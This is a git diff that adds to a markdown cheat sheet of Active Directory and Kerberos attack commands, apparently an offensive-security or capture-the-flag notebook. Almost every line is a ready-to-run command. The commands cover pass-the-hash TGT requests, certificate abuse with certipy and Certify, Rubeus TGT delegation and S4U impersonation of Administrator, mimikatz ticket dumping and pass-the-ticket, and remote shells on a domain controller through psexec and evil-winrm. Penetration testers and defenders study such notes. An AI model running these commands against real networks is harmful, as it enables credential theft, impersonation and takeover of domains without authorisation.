@@ -1,5 +1,112 @@
+<img width="1662" height="608" alt="image" src="https://github.com/user-attachments/assets/176f30d6-1f09-430f-8b1e-d38e2f0015b7" />
+
+---
+
+# With Password or Hash
+
+## CCACHE
+```powershell
+python3 getTGT.py domain.local/Administrator -hashes :aad3b435b51404eeaad3b435b51404ee:NTHASH
+python3 getTGT.py domain.local/user:Password123
+
+export KRB5CCNAME=user.ccache
+klist
+```
+
+## PFX to CCACHE
+```powershell
+certipy req -u 'user@domen.local' -p 'password' -ca 'CA_NAME' -target 'CA-IP' -template 'Template_NAME' -dc-ip 'DC-IP'
+
+certipy auth \
+  -pfx user.pfx \
+  -domain domain.local \
+  -username user \
+  -dc-ip 10.10.10.10
+```
+
+## PFX to PEM
+```powershell
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
+
+evil-winrm \
+  -i 10.10.10.10 \
+  -S \
+  -c cert.pem \
+  -k key.pem
+```
+---
+
+# Without Password
+
+## TGT Delegation
+```powershell
+.\Rubeus.exe tgtdeleg /nowrap
+
+nano svc_sql.kirbi.b64
+cat svc_sql.kirbi.b64 | base64 -d > svc_sql.kirbi
+
+impacket-ticketConverter svc_sql.kirbi svc_sql.ccache
+export KRB5CCNAME=svc_sql.ccache
+```
+
+## S4U2Self
+```powershell
+.\Rubeus.exe s4u \
+  /user:svc_sql \
+  /rc4:NTHASH \
+  /impersonateuser:Administrator \
+  /msdsspn:"cifs/dc.domain.local" \
+  /nowrap
+
+
+
+.\Rubeus.exe asktgt /user:svc_sql /rc4:NTHASH /nowrap
+
+.\Rubeus.exe s4u \
+  /ticket:BASE64_TGT \
+  /impersonateuser:Administrator \
+  /msdsspn:"cifs/dc.domain.local" \
+  /nowrap
+```
+
+## S4U2Self in Linux
+```powershell
+impacket-getST \
+  -spn "cifs/dc.domain.local" \
+  -impersonate user \
+  -hashes :NTHASH \
+  domain.local/svc_sql
+
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass domain.local/User@dc.domain.local
+```
+
+## AD CS Certification
+```powershell
+.\Certify.exe request /ca:domain.local\CA_NAME /template:User
+```
+
+## Ticket Dump
+```powershell
+.\Rubeus.exe triage
+.\Rubeus.exe dump /nowrap
+
+.\Rubeus.exe dump /service:SERVICE_NAME /nowrap
+
+privilege::debug
+sekurlsa::tickets /export
+kerberos::ptt ticket.kirbi
+
+impacket-ticketConverter ticket.kirbi ticket.ccache
+export KRB5CCNAME=ticket.ccache
+klist
+```
+
 ## KRB5.conf
 ```powershell
+echo "10.129.232.130 dc.voleur.htb" >> /etc/hosts
+
 // Get TGT
 impacket-getTGT voleur.htb/svc_winrm -dc-ip 10.129.232.130
 
@@ -26,14 +133,6 @@ EOF
 
 // Connect with TGT
 evil-winrm -i dc.voleur.htb -r VOLEUR.HTB                                                                                                               
-```
-
-## PFX Authentication
-```
-openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
-openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
-
-evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S
 ```
 
 ## TGT Delegation
